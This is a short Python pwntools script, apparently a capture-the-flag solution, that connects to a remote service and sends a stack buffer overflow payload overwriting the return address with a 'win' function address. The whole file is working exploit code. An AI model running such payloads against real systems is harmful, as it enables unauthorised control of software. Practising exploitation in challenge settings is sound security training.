#!/usr/bin/env python3

from pwn import *

conn = remote('140.113.207.240',8834)
conn.recvuntil('spell: ')

# by gdb p win
win_address = 0x4011b6

# 64bytes for input, 8bytes for alignment, 8bytes for fp
conn.sendline(b'0'*(64) + b'0'*(8) + p64(win_address))
print (conn.recvline())
conn.close()